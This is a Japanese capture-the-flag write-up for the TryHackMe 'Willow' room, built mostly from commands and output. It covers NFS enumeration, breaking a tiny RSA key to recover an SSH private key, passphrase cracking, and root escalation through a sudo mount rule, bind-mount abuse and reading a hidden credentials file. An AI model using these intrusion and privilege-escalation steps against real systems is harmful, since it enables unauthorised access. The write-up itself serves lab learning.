# Willow CTF

https://tryhackme.com/room/willow

## Enumeration

```shell
TARGET=10.201.63.241
sudo bash -c "echo $TARGET   willow.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs
```

```sh
sudo nmap -sS -sV -p22,80,111,2049 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 2-3 (RPC #100227)
```

SSH, HTTP, RPC, NFS

### NFS

```sh
$ showmount -e $TARGET
Export list for 10.201.63.241:
/var/failsafe *
```

RSA鍵のパラメータが入っていた。

```sh
$ sudo mount -t nfs $TARGET:/var/failsafe /mnt

$ ls -al /mnt                                     
total 12
drwxr--r--  2 nobody nogroup 4096 Jan 30  2020 .
drwxr-xr-x 18 root   root    4096 Sep  9 06:53 ..
-rw-r--r--  1 root   root      62 Jan 30  2020 rsa_keys

$ cat /mnt/rsa_keys
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

37627 = 191 * 197

```python
from Crypto.PublicKey import RSA

# RSAのパラメータ
n = 37627
e = 23
p = 191
q = 197

phi = (p-1)*(q-1)
d = pow(e, -1, phi)

# 鍵オブジェクトの構築
key = RSA.construct((n, e, d, p, q))

# 秘密鍵（PEM形式）
private_pem = key.export_key()
with open("rsa_private.pem", "wb") as f:
    f.write(private_pem)

# 公開鍵（PEM形式）
public_pem = key.public_key().export_key()
with open("rsa_public.pem", "wb") as f:
    f.write(public_pem)

print("PEM鍵を出力しました：")
print("  rsa_private.pem")
print("  rsa_public.pem")
```

## HTTP

表示されたテキスト hex2ascii 変換すると下記テキストになった。

```
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029 26842 16186 18410 23219 37248 11339 8600 33029 35670 8600 31131 2367 2367 2367（以下略）
```

最大値が37438であるため、2バイトごとのバイト列として解釈でき、それが暗号化されたSSH秘密鍵ということだと思われる。

バイナリファイルとして出力。

```python
input_file = "input.txt"     # 元のテキストファイル
output_file = "output.bin"   # 出力するバイナリファイル

# ファイル読み込み
with open(input_file, "r") as f:
    content = f.read()

# 空白で区切って整数リストに変換
numbers = [int(x) for x in content.split()]

# バイト列に変換（リトルエンディアン、2バイトずつ）
byte_array = bytearray()
for n in numbers:
    if not 0 <= n <= 0xFFFF:
        raise ValueError(f"数値 {n} が16bitの範囲を超えています")
    byte_array.extend(n.to_bytes(2, byteorder="little"))

# ファイルに書き込み
with open(output_file, "wb") as f:
    f.write(byte_array)

print(f"{len(numbers)}個の整数を {len(byte_array)}バイトとして {output_file} に保存しました")
```

前に保存したRSA鍵を使って復号

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import math

# 秘密鍵読み込み
with open("rsa_private.pem", "rb") as f:
    key = RSA.import_key(f.read())

# バイナリデータ読み込み
with open("output.bin", "rb") as f:
    data = f.read()

d = key.d
n = key.n
k = math.ceil(key.size_in_bits() / 8)

# 復号
cipher = PKCS1_v1_5.new(key)
plaintext = b""
for i in range(0, len(data), k):
    c = int.from_bytes(data[i:i+k], "little")  # リトルエンディアンで復号
    m = pow(c, d, n)
    block = m.to_bytes(k, "little")
    plaintext += block

# 結果を出力
with open("decrypted.bin", "wb") as f:
    f.write(plaintext)

print("復号完了 -> decrypted.bin に保存")
```

これがSSH秘密鍵だと思われる。

```sh
$ cat ./decrypted.bin 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
[REDACTED]
-----END RSA PRIVATE KEY-----
```

rockyou.txt でパスフレーズをクラックできた。  
ユーザー名不明だったが、willow でログインできた。

```sh
$ ssh willow@10.201.63.241 -i ./id_rsa -o 'PubkeyAcceptedKeyTypes +ssh-rsa'
```

user.jpg を表示したらユーザーフラグが表示された。

## 権限昇格

```sh
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

/dev/* の部分が無ければ、このようにmount自体を置き換えることができるが・・・

```sh
sudo mount -o bind /bin/sh /bin/mount
sudo mount
```

ワイルドカードを悪用できないか考えたが失敗。スラッシュはファイル名に使えない。そもそも /dev に書き込み権限が無い。

```sh
willow@willow-tree:~$ touch "/dev/-o bind /bin/sh"
touch: cannot touch ‘/dev/-o bind /bin/sh’: No such file or directory
```

/dev の中を調べると、hidden_backup がある。

```sh
willow@willow-tree:~$ ls /dev
autofs           fuse           network_latency     snd     tty17  tty3   tty42  tty55  ttyS1    vcsa         xen
block            hidden_backup  network_throughput  stderr  tty18  tty30  tty43  tty56  ttyS2    vcsa1        xvda
btrfs-control    hpet           null                stdin   tty19  tty31  tty44  tty57  ttyS3    vcsa2        xvda1
char             hugepages      port                stdout  tty2   tty32  tty45  tty58  uhid     vcsa3        xvda2
console          initctl        ppp                 tty     tty20  tty33  tty46  tty59  uinput   vcsa4        xvda3
core             input          psaux               tty0    tty21  tty34  tty47  tty6   urandom  vcsa5        xvdh
cpu              kmsg           ptmx                tty1    tty22  tty35  tty48  tty60  vcs      vcsa6        zero
cpu_dma_latency  log            pts                 tty10   tty23  tty36  tty49  tty61  vcs1     vcsa7
cuse             loop-control   random              tty11   tty24  tty37  tty5   tty62  vcs2     vfio
disk             mapper         rfkill              tty12   tty25  tty38  tty50  tty63  vcs3     vga_arbiter
dri              mcelog         rtc                 tty13   tty26  tty39  tty51  tty7   vcs4     vhci
fb0              mem            rtc0                tty14   tty27  tty4   tty52  tty8   vcs5     vhost-net
fd               mqueue         shm                 tty15   tty28  tty40  tty53  tty9   vcs6     vmci
full             net            snapshot            tty16   tty29  tty41  tty54  ttyS0  vcs7     xconsole
```

```sh
willow@willow-tree:~$ ls -al /dev/hidden_backup
brw-rw---- 1 root disk 202, 5 Nov  3 00:47 /dev/hidden_backup
```

現在 /mnt 内にある creds は空の状態。

```sh
willow@willow-tree:~$ ls /mnt
creds

willow@willow-tree:~$ ls -al /mnt/creds
total 8
drwxr-xr-x 2 root root 4096 Jan 30  2020 .
drwxr-xr-x 3 root root 4096 Jan 30  2020 ..
```

ここにマウント

```sh
willow@willow-tree:~$ sudo /bin/mount /dev/hidden_backup /mnt/creds/
```

```sh
willow@willow-tree:~$ ls -al /mnt/creds
total 6
drwxr-xr-x 2 root root 1024 Jan 30  2020 .
drwxr-xr-x 3 root root 4096 Jan 30  2020 ..
-rw-r--r-- 1 root root   42 Jan 30  2020 creds.txt
```

```sh
willow@willow-tree:~$ cat /mnt/creds/creds.txt 
root:[REDACTED]
willow:[REDACTED]
```

昇格成功。ちなみに、`su -` だとエラーになってハマった。

```sh
willow@willow-tree:~$ su
Password: 
root@willow-tree:/home/willow# 
```

イラッ

```sh
root@willow-tree:/home/willow# cat /root/root.txt 
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```

怒りの雑検索では何も出なかった。

```sh
root@willow-tree:/home/willow# find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "THM{" {} /dev/null \; 2>/dev/null | awk 'length($0) < 1000'
```

深呼吸して `I actually gave you the root flag some time ago.` の意味を理解。

```sh
$ steghide --extract -sf ./user.jpg 
Enter passphrase: 
wrote extracted data to "root.txt".
```

## 振り返り

- 暗号系は理解したつもりになってもすぐ忘れる。
- mount コマンドは普段ほとんど使わないので勉強になった。
